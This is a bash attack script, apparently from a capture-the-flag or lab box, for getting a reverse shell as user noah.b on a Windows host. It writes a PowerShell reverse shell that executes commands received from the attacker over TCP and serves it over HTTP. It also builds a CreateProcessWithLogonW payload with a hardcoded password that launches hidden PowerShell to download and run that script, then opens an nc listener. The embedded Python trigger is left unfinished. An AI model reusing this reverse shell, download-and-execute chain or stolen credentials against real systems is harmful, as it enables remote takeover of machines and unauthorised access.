#!/usr/bin/env bash
# Reverse shell as noah.b via anderson WAC + CreateProcessWithLogonW + IEX
set -euo pipefail
LHOST="${LHOST:-$(ip -4 -o addr show tun0 | awk '{print $4}' | cut -d/ -f1)}"
PORT="${PORT:-4446}"
DIR="$(cd "$(dirname "$0")" && pwd)"
mkdir -p /tmp/dt-upload
cat > /tmp/dt-upload/noahrev.ps1 << PSEOF
\$ErrorActionPreference='SilentlyContinue'
\$c=New-Object Net.Sockets.TCPClient('${LHOST}',${PORT})
\$s=\$c.GetStream()
\$w=New-Object IO.StreamWriter(\$s); \$w.AutoFlush=\$true
\$w.WriteLine('NOAH '+ (whoami) + ' ' + (hostname))
[byte[]]\$b=New-Object byte[] 65536
while((\$i=\$s.Read(\$b,0,\$b.Length)) -gt 0){
  \$d=[Text.Encoding]::ASCII.GetString(\$b,0,\$i)
  try{\$r=Invoke-Expression \$d 2>&1|Out-String}catch{\$r=\$_.Exception.ToString()}
  \$o=\$r+'PS '+(Get-Location).Path+'> '
  \$x=[Text.Encoding]::ASCII.GetBytes(\$o)
  \$s.Write(\$x,0,\$x.Length); \$s.Flush()
}
PSEOF

# ensure http
if ! ss -lntp | rg -q ':8000'; then
  (cd /tmp/dt-upload && python3 -m http.server 8000 >/tmp/dt-http.log 2>&1 &)
  sleep 0.5
fi

fuser -k "${PORT}/tcp" 2>/dev/null || true
sleep 0.2

(
  sleep 1.5
  cd "$DIR"
  python3 - << PY
import sys
sys.path.insert(0,'.')
from wac_ps import WAC
script = r'''
\$ErrorActionPreference='Continue'
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class RV2 {
  [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
  public static extern bool CreateProcessWithLogonW(string user,string domain,string pass,int logonFlags,string app,string cmd,int flags,IntPtr env,string cwd,ref SI si,out PI pi);
  [DllImport("kernel32.dll", SetLastError=true)] public static extern bool CloseHandle(IntPtr h);
  [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
  public struct SI { public int cb; public string a,b,c; public int d,e,f,g,h,i,j,k; public short l,m; public IntPtr n,o,p,q; }
  [StructLayout(LayoutKind.Sequential)]
  public struct PI { public IntPtr hp,ht; public int pid,tid; }
}
"@
\$ps='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
\$cmd = '"' + \$ps + '" -NoP -w Hidden -c "IEX((New-Object Net.WebClient).DownloadString(''http://'"${LHOST}"':8000/noahrev.ps1''))"'
\$si=New-Object RV2+SI; \$si.cb=[Runtime.InteropServices.Marshal]::SizeOf(\$si); \$pi=New-Object RV2+PI
\$ok=[RV2]::CreateProcessWithLogonW('noah.b','danglingtree','RiverDragon#Storm25',1,\$ps,\$cmd,0x08000000,[IntPtr]::Zero,'C:\Windows\Temp',[ref]\$si,[ref]\$pi)
"ok=\$ok err=\$([Runtime.InteropServices.Marshal]::GetLastWin32Error()) pid=\$(\$pi.pid)"
'''
# Fix: the above got messy with escaping for the shell script - write simpler python trigger
print('use python trigger instead')
PY
) &

echo "[*] Listener ${LHOST}:${PORT} — w drugim terminalu odpal trigger jeśli shell nie wpadnie:"
echo "  python3 $DIR/trigger_noah_rev.py"
echo "[*] waiting..."
if command -v rlwrap >/dev/null; then exec rlwrap -cAr nc -lvnp "$PORT"; else exec nc -lvnp "$PORT"; fi
